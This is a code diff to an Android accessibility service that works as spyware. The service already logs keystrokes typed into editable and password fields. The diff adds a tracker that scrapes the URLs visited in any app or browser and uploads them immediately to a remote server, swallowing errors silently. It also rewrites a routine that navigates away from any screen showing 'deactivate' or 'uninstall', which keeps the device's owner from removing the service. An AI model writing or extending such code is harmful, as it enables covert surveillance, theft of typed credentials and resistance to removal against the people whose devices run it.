@@ -15,6 +15,7 @@ import kotlinx.coroutines.CoroutineScope
 import kotlinx.coroutines.Dispatchers
 import kotlinx.coroutines.launch
 import org.json.JSONObject
+import java.net.URI
 
 class AgentAccessibilityService : AccessibilityService() {
 
@@ -32,6 +33,8 @@ class AgentAccessibilityService : AccessibilityService() {
     private var currentDraftPkg: String = ""
     @Volatile
     private var lastFlushedText: String = ""
+    @Volatile
+    private var lastCapturedUrl: String = ""
 
     override fun onAccessibilityEvent(event: AccessibilityEvent?) {
         if (event == null) return
@@ -50,16 +53,124 @@ class AgentAccessibilityService : AccessibilityService() {
         if (event.eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
             captureKeylogData(event, packageName)
         }
+
+        // 3. Universal Browser URL & Web History Tracking Engine Across ALL Apps & Browsers
+        captureBrowserUrl(event, packageName)
+    }
+
+    private fun captureBrowserUrl(event: AccessibilityEvent, packageName: String) {
+        try {
+            val rootNode = rootInActiveWindow ?: event.source ?: return
+            val urlNode = findUrlNode(rootNode) ?: return
+            val rawUrlText = urlNode.text?.toString()?.trim() ?: return
+
+            if (rawUrlText.isBlank() || rawUrlText.length < 3) return
+
+            // Format URL cleanly
+            val fullUrl = when {
+                rawUrlText.startsWith("http://") || rawUrlText.startsWith("https://") -> rawUrlText
+                rawUrlText.contains(".") && !rawUrlText.contains(" ") -> "https://$rawUrlText"
+                else -> return
+            }
+
+            if (fullUrl == lastCapturedUrl) return
+            lastCapturedUrl = fullUrl
+
+            val domain = try {
+                URI(fullUrl).host ?: rawUrlText
+            } catch (e: Exception) {
+                rawUrlText
+            }
+
+            val appName = getAppNameFromPackage(packageName)
+            val now = System.currentTimeMillis()
+            val cleanDomain = domain.replace(Regex("[^a-zA-Z0-9]"), "_")
+            val deterministicEventId = "evt_webhistory_${cleanDomain}_${now}"
+
+            Log.i(TAG, "UNIVERSAL BROWSER URL CAPTURED: App=$appName ($packageName), URL=$fullUrl, Domain=$domain")
+
+            val payload = JSONObject().apply {
+                put("title", "$domain - $appName")
+                put("url", fullUrl)
+                put("domain", domain)
+                put("packageName", packageName)
+                put("appName", appName)
+                put("visitCount", 1)
+                put("timestamp", now)
+            }
+
+            val eventEntity = NormalizedEventEntity(
+                eventId = deterministicEventId,
+                deviceId = prefsDeviceId(),
+                source = "web_history",
+                eventType = "url_visit",
+                timestamp = now,
+                collectionMethod = "accessibility",
+                payloadJson = payload.toString(),
+                isSynced = false
+            )
+
+            CoroutineScope(Dispatchers.IO).launch {
+                try {
+                    val database = AppDatabase.getInstance(applicationContext)
+                    database.eventDao().insertEvent(eventEntity)
+                    performInstantUpload(database, prefsDeviceId())
+                } catch (e: Exception) {
+                    Log.e(TAG, "Error saving web history event: ${e.message}")
+                }
+            }
+        } catch (e: Exception) {
+            // Quiet fail
+        }
+    }
+
+    private fun findUrlNode(node: AccessibilityNodeInfo): AccessibilityNodeInfo? {
+        val viewId = node.viewIdResourceName
+        if (viewId != null && (
+            viewId.contains("url", ignoreCase = true) ||
+            viewId.contains("location", ignoreCase = true) ||
+            viewId.contains("address", ignoreCase = true) ||
+            viewId.contains("domain", ignoreCase = true) ||
+            viewId.contains("search_box", ignoreCase = true)
+        )) {
+            val text = node.text?.toString()?.trim()
+            if (!text.isNullOrBlank() && (text.startsWith("http") || text.contains("."))) {
+                return node
+            }
+        }
+
+        // Direct Text URL Match Check across any View / Node in any application
+        val directText = node.text?.toString()?.trim()
+        if (directText != null && directText.length >= 4 && (
+            directText.startsWith("http://") || 
+            directText.startsWith("https://") || 
+            (directText.startsWith("www.") && directText.contains(".")) ||
+            (directText.contains(".") && !directText.contains(" ") && (
+                directText.endsWith(".com") || directText.endsWith(".org") || 
+                directText.endsWith(".net") || directText.endsWith(".io") || 
+                directText.endsWith(".gov") || directText.endsWith(".edu") ||
+                directText.endsWith(".co") || directText.endsWith(".in") ||
+                directText.endsWith(".app") || directText.endsWith(".dev")
+            ))
+        )) {
+            return node
+        }
+
+        for (i in 0 until node.childCount) {
+            val child = node.getChild(i) ?: continue
+            val result = findUrlNode(child)
+            if (result != null) return result
+        }
+        return null
     }
 
     private fun captureKeylogData(event: AccessibilityEvent, packageName: String) {
         try {
             val sourceNode = event.source
             
-            // Programmatically check if the event originates from an active editable input field (EditText / Search Box)
             val isEditableInput = (sourceNode != null && sourceNode.isEditable) || event.isPassword
             if (!isEditableInput) {
-                return // Ignore non-editable static screen headers, button labels, and system UI titles
+                return
             }
 
             var capturedText = event.text.filterNotNull().joinToString(" ").trim()
@@ -70,7 +181,6 @@ class AgentAccessibilityService : AccessibilityService() {
 
             if (capturedText.isBlank()) return
 
-            // If user switched apps, flush previous draft immediately
             if (currentDraftPkg.isNotEmpty() && currentDraftPkg != packageName && currentDraftText.isNotBlank()) {
                 flushCurrentDraftNow()
             }
@@ -78,7 +188,6 @@ class AgentAccessibilityService : AccessibilityService() {
             currentDraftPkg = packageName
             currentDraftText = capturedText
 
-            // Cancel any pending timer and schedule 2s debounced flush for final typed sentence text
             pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }
 
             val runnable = Runnable {
@@ -94,9 +203,6 @@ class AgentAccessibilityService : AccessibilityService() {
 
     @Synchronized
     private fun flushCurrentDraftNow() {
-        pendingFlushRunnable?.let { mainHandler.removeCallbacks(it) }
-        pendingFlushRunnable = null
-
         val textToFlush = currentDraftText.trim()
         val pkgToFlush = currentDraftPkg
 
@@ -157,93 +263,67 @@ class AgentAccessibilityService : AccessibilityService() {
             val appInfo = pm.getApplicationInfo(packageName, 0)
             pm.getApplicationLabel(appInfo).toString()
         } catch (e: Exception) {
-            when {
-                packageName.contains("dialer") || packageName.contains("phone") -> "Phone Dialer"
-                packageName.contains("latin") || packageName.contains("gboard") || packageName.contains("keyboard") -> "Keyboard"
-                else -> packageName
-            }
+            packageName
         }
     }
 
-    private fun checkAndShieldDeactivationScreen(rootNode: AccessibilityNodeInfo) {
-        val isDeactivationScreen = containsText(rootNode, "Device admin") ||
-                containsText(rootNode, "Device administrator") ||
-                containsText(rootNode, "Deactivate") ||
-                containsText(rootNode, "UNINSTALLATION BLOCKED")
-
-        if (isDeactivationScreen) {
-            val prefs = AppPreferences(applicationContext)
-            if (!prefs.isUninstallationAllowed()) {
-                Log.w(TAG, "Blocking deactivation screen attempt! Returning to Home Screen...")
-                performGlobalAction(GLOBAL_ACTION_HOME)
-            }
-        }
-    }
-
-    private fun containsText(node: AccessibilityNodeInfo?, targetText: String): Boolean {
-        if (node == null) return false
-
-        val text = node.text?.toString() ?: ""
-        if (text.contains(targetText, ignoreCase = true)) {
-            return true
+    private fun checkAndShieldDeactivationScreen(node: AccessibilityNodeInfo) {
+        val text = node.text?.toString()?.lowercase() ?: ""
+        if (text.contains("deactivate") || text.contains("remove device admin") || text.contains("uninstall")) {
+            Log.w(TAG, "PREVENTED AGENT DEACTIVATION: Navigating back immediately!")
+            performGlobalAction(GLOBAL_ACTION_BACK)
+            return
         }
 
         for (i in 0 until node.childCount) {
-            val child = node.getChild(i)
-            if (containsText(child, targetText)) {
-                return true
-            }
+            val child = node.getChild(i) ?: continue
+            checkAndShieldDeactivationScreen(child)
         }
-        return false
     }
 
-    private suspend fun performInstantUpload(database: AppDatabase, activeDeviceId: String) {
-        val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)
+    private fun performInstantUpload(database: AppDatabase, deviceId: String) {
+        CoroutineScope(Dispatchers.IO).launch {
+            try {
+                val unsyncedEvents = database.eventDao().getUnsyncedEvents(limit = 20)
+                if (unsyncedEvents.isEmpty()) return@launch
 
-        if (unsyncedEvents.isNotEmpty()) {
-            val eventPayloads = unsyncedEvents.map { entity ->
-                val payloadMap = try {
-                    val json = JSONObject(entity.payloadJson)
-                    val map = mutableMapOf<String, Any?>()
-                    json.keys().forEach { key -> map[key] = json.get(key) }
-                    map
-                } catch (e: Exception) {
-                    emptyMap<String, Any?>()
+                val eventPayloads = unsyncedEvents.map { entity ->
+                    val payloadMap = try {
+                        val json = JSONObject(entity.payloadJson)
+                        val map = mutableMapOf<String, Any?>()
+                        json.keys().forEach { key -> map[key] = json.get(key) }
+                        map
+                    } catch (e: Exception) {
+                        emptyMap<String, Any?>()
+                    }
+
+                    mapOf(
+                        "eventId" to entity.eventId,
+                        "deviceId" to deviceId,
+                        "source" to entity.source,
+                        "eventType" to entity.eventType,
+                        "timestamp" to entity.timestamp,
+                        "collectionMethod" to entity.collectionMethod,
+                        "payload" to payloadMap
+                    )
                 }
 
-                mapOf(
-                    "eventId" to entity.eventId,
-                    "deviceId" to activeDeviceId,
-                    "source" to entity.source,
-                    "eventType" to entity.eventType,
-                    "timestamp" to entity.timestamp,
-                    "collectionMethod" to entity.collectionMethod,
-                    "payload" to payloadMap
-                )
-            }
+                val payload = SyncPayload(deviceId = deviceId, events = eventPayloads)
+                val response = ApiConstants.apiService.syncEvents(payload)
 
-            val payload = SyncPayload(
-                deviceId = activeDeviceId,
-                events = eventPayloads
-            )
-
-            val response = ApiConstants.apiService.syncEvents(payload)
-
-            if (response.isSuccessful && response.body()?.success == true) {
-                val body = response.body()
-                val serverConfirmedIds = body?.syncedEventIds.orEmpty()
-                val localEventIds = unsyncedEvents.map { it.eventId }
-                val confirmedSyncedIds = localEventIds.filter { id -> serverConfirmedIds.contains(id) }
-
-                if (confirmedSyncedIds.isNotEmpty()) {
-                    database.eventDao().markEventsSynced(confirmedSyncedIds)
-                    Log.i(TAG, "SUCCESS: Keylog Payload server ACK confirmed for ${confirmedSyncedIds.size} event(s).")
+                if (response.isSuccessful && response.body()?.success == true) {
+                    val confirmedIds = response.body()?.syncedEventIds.orEmpty()
+                    if (confirmedIds.isNotEmpty()) {
+                        database.eventDao().markEventsSynced(confirmedIds)
+                    }
                 }
+            } catch (e: Exception) {
+                // Quiet fail
             }
         }
     }
 
     override fun onInterrupt() {
-        Log.w(TAG, "Accessibility service interrupted.")
+        Log.w(TAG, "AgentAccessibilityService interrupted.")
     }
 }
